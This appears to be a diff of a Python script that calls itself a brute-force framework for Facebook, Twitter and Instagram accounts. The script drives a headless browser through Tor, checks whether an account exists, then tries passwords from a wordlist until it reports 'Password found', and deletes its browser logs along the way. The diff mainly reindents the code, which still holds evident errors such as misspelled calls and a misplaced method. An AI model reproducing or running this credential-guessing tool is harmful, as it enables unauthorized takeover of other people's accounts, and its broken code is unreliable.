@@ -14,7 +14,7 @@ print """\033[1;37m
 |  __ \           |  _ \           | |      
 | |  | | _____   _| |_) |_ __ _   _| |_ ___ 
 | |  | |/ _ \ \ / /  _ <| '__| | | | __/ _ \
-| |__| |  __/\ V /| |_) | |  | |_| | ||  __/
+        | |__| |  __/\ V /| |_) | |  | |_| | ||  __/
 |_____/ \___| \_/ |____/|_|   \__,_|\__\___|"""
 
 url = raw_input('\033[1;34m[?]\033[0m Enter target URL: ') #takes input
@@ -25,9 +25,9 @@ sys.setdefaultenciding('utf8')
 
 
 def main():
-	parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming') 
-	required = parser.add_argument_group('required arguments')
-	required.add_argument('-s', '--service', dest='service')
+    parser = argparse.ArgumentParser(description='BruteForce Framework written by Devprogramming') 
+    required = parser.add_argument_group('required arguments')
+    required.add_argument('-s', '--service', dest='service')
     required.add_argument('-u', '--username', dest='username')
     required.add_argument('-w', '--wordlist', dest='password')
     parser.add_argument('-d', '--delay', type=int, dest='delay')
@@ -42,22 +42,22 @@ def main():
     delay = args.delay
 
     if os.path.exist(wordlist) == False:
-    	print(R + "Error : Wordlist Not Found" + W)
-    	exit(1)
+        print(R + "Error : Wordlist Not Found" + W)
+        exit(1)
 
     if delay is None:
-    	delay = 1
+        delay = 1
     os.system("clear")
 
     if service == "facebook":
-    	fb_name = raw_input(O + "Please Enter the Name of the Facebook Account :" + W)
-    	os.system("clear")
+        fb_name = raw_input(O + "Please Enter the Name of the Facebook Account :" + W)
+        os.system("clear")
 
-    	#This Restart tor & Removing GeckoDriver Log
-    	os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") 
+        #This Restart tor & Removing GeckoDriver Log
+        os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") 
 
 
-    	Bruter(service, username, wordlist, delay).execute()
+        Bruter(service, username, wordlist, delay).execute()
 
 
 class Bruter(object):
@@ -74,19 +74,19 @@ class Bruter(object):
         self.delay = delay
 
 
-    	def stopTOR(self):   # Stoping Tor
+        def stopTOR(self):   # Stoping Tor
 
-        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
+            os.system("rm -rf tmp/ geckodriver.log && service tor stop")
 
         exit(1)
 
 
     def execute(self):   # Connection Between def main() 
-  
+
         if self.usercheck(self.username, self.service) == 1:
 
             print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
-            
+
             exit(1)
 
         print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
@@ -96,7 +96,7 @@ class Bruter(object):
 
     def usercheck(self, username, service):          # Checking Username
 
-       display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
+        display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
        display.start()
 
        driver = webdriver.Firefox()
@@ -159,7 +159,7 @@ class Bruter(object):
                     WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
 
                     elem = driver.find_element_by_name("email")
-            
+
                 elif service == "twitter":
 
                     driver.get("https://mobile.twitter.com/session/new")
@@ -212,7 +212,7 @@ class Bruter(object):
 
                 elif service == "instagram":
 
-                   assert (("Log in — Instagram") in driver.title)
+                    assert (("Log in — Instagram") in driver.title)
 
 
                 driver.quit()
@@ -227,7 +227,7 @@ class Bruter(object):
                 sleep(delay)
 
             except AssertionError: 
-            
+
                 print(G + ("  Username: {} \t| Password found: {}\n".format(username,password)) + W)
 
                 driver.quit()
